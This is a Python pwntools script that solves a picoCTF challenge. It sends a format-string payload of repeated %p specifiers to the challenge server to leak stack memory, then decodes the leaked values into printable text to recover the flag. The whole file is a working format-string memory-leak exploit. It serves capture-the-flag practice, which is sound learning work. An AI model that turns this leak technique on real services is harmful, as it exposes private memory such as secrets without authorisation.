from pwn import *


p = remote('saturn.picoctf.net', 59402)

p.recvuntil(b'>> ')

payload = b'%31$p.%32$p.%33$p.%34$p.%35$p.%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.%46$p.%47$p.%48$p.%49$p.%50$p.%51$p.%52$p.%53$p.%54$p.%55$p'
p.sendline(payload)
p.recvuntil(b'\n')
response = p.recvline().strip().decode();
values = response.split('.')
print(values)
for val in values:
    try:
        num = int(val, 16)

        num_bytes = (num.bit_length() + 7) // 8

        b = num.to_bytes(num_bytes, 'little')

        print(''.join(chr(x) if 32 <= x <= 127 else '' for x in b), end='')
    except:
        pass


print()


